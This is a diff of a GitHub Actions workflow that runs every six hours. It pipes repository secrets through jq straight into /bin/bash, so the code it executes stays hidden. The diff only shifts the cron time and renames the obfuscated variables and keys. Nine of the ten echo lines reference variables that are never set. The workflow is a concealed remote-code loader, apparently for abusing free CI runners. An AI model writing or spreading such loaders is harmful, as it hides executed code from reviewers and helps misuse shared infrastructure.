@@ -3,7 +3,7 @@ name: jinxinnian3421
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 0/6 * * *'
+    - cron: '49 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: jinxinnian3421
         env:
-          rgam2: ${{ secrets.rgam2 }}
+          nde3: ${{ secrets.nde3 }}
         run: |
-          echo $rgam2 | jq -r .cdws15528 | /bin/bash
-          echo $eibt8904 | jq -r .khiy1229 | /bin/bash
-          echo $duxys75 | jq -r .hvqtv50 | /bin/bash
-          echo $zx81 | jq -r .o03 | /bin/bash
-          echo $kqxv9956 | jq -r .kg48 | /bin/bash
-          echo $vnmd11546 | jq -r .bisf533 | /bin/bash
-          echo $dsues3461 | jq -r .yfg46 | /bin/bash
-          echo $gofqq55765 | jq -r .g6129 | /bin/bash
-          echo $juzq00 | jq -r .kpsdc18 | /bin/bash
-          echo $qi194 | jq -r .rvsyl51 | /bin/bash
+          echo $nde3 | jq -r .t2 | /bin/bash
+          echo $ovsgc08 | jq -r .nde47 | /bin/bash
+          echo $syhp215 | jq -r .vk90 | /bin/bash
+          echo $lxdyn9958 | jq -r .xsst84 | /bin/bash
+          echo $j23417 | jq -r .alee1 | /bin/bash
+          echo $agj7008 | jq -r .fuv28845 | /bin/bash
+          echo $cb60557 | jq -r .qm43 | /bin/bash
+          echo $mpvls100 | jq -r .d230 | /bin/bash
+          echo $asn3 | jq -r .yfpyt14 | /bin/bash
+          echo $dv15331 | jq -r .qmt3812 | /bin/bash
 
